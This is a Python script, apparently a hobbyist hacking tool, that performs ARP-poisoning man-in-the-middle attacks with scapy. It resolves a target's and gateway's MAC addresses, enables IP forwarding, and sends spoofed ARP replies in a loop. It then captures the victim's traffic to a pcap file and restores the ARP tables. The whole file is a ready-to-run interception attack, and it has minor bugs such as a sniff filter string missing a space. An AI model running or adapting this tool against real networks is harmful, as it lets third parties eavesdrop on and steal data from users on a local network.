import os, sys, multiprocessing
from scapy.all import *

interface = "eth0"
TargetIP="192.168.0.101"
gateIP = "192.168.0.1"        #modify this variables to your liking
packets = 9999999
logfile = "log.pcap"
bcast = "ff:ff:ff:ff:ff:ff"

def ip2mac(ip):
    rsp = srp1(Ether(dst=bcast) / ARP(pdst=ip), timeout=2, retry=3)
    return rsp[Ether].src

def arpPoison(gateIp, gateMac, targetIp, targetMac):
    while True:
        try:
            print("[*] ARP poisoning [CTRL-C to stop]")
            send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst=targetMac))
            send(ARP(op=2, psrc=targetIP, pdst=gateIp, hwdst=gateMac))
            time.sleep(2)
        except KeyboardInterrupt:
            pass

def arpRestore(gateIp, gateMac, targetIp, targetMac):
    for x in range(5):
        print("[*] Restoring ARP table [" + str(x) + " of 4]")
        send(ARP(op=2, psrc=gateIp, pdst=targetIp, hwdst=bcast, hwsrc=gateMac), count=5)
        send(ARP(op=2, psrc=targetIp, pdst=gateIp, hwdst=bcast, hwsrc=targetMac), count=5)
        time.sleep(2)



if __name__ == "__main__":
    conf.iface = interface
    conf.verb = 0
    gateMac = ip2mac(gateIP)
    targetMac = ip2mac(TargetIP)
    print(""":::::::::   :::::::: ::::::::::: ::::::::   ::::::::  ::::    ::: ::::::::::: ::::::::::: ::::    ::::  
:+:    :+: :+:    :+:    :+:    :+:    :+: :+:    :+: :+:+:   :+:     :+:         :+:     +:+:+: :+:+:+ 
+:+    +:+ +:+    +:+    +:+    +:+        +:+    +:+ :+:+:+  +:+     +:+         +:+     +:+ +:+:+ +:+ 
+#++:++#+  +#+    +:+    +#+    +#++:++#++ +#+    +:+ +#+ +:+ +#+     +#+         +#+     +#+  +:+  +#+ 
+#+        +#+    +#+    +#+           +#+ +#+    +#+ +#+  +#+#+#     +#+         +#+     +#+       +#+ 
#+#        #+#    #+#    #+#    #+#    #+# #+#    #+# #+#   #+#+#     #+#         #+#     #+#       #+# 
###         ######## ########### ########   ########  ###    #### ###########     ###     ###       ### """)
    print("Man In the Middle ARP Poisoning Tool Made By The3ye")
    print("Github: https://github.com/The3yeHTB")
    print("HackTheBox: https://app.hackthebox.com/users/716430")
    print("[*] Interface: " + interface)
    print("[*] Gateway: " + gateIP + " [" + gateMac + "]")
    print("[*] Target: " + TargetIP + " [" + targetMac + "]")
    print("[*] Enabling Packet Forwarding...")
    os.system("/sbin/sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1")
    p=multiprocessing.Process(target=arpPoison, args=(gateIP, gateMac, TargetIP, targetMac))
    p.start()

    print("[*] Sniffing Packets...")
    packets = sniff(count=packets, filter=("ip host" + TargetIP), iface=interface)
    wrpcap(logfile, packets)
    p.terminate()
    print("[*] Sniffing Complete , That was satisfying... :)")

    print("[*] Disabling Packet Forwarding...")
    os.system("/sbin/sysctl -w net.ipv4.ip_forward=0 >/dev/null 2>&1")
    arpRestore(gateIP, gateMac, TargetIP, targetMac)
    print("[*] Exiting...")
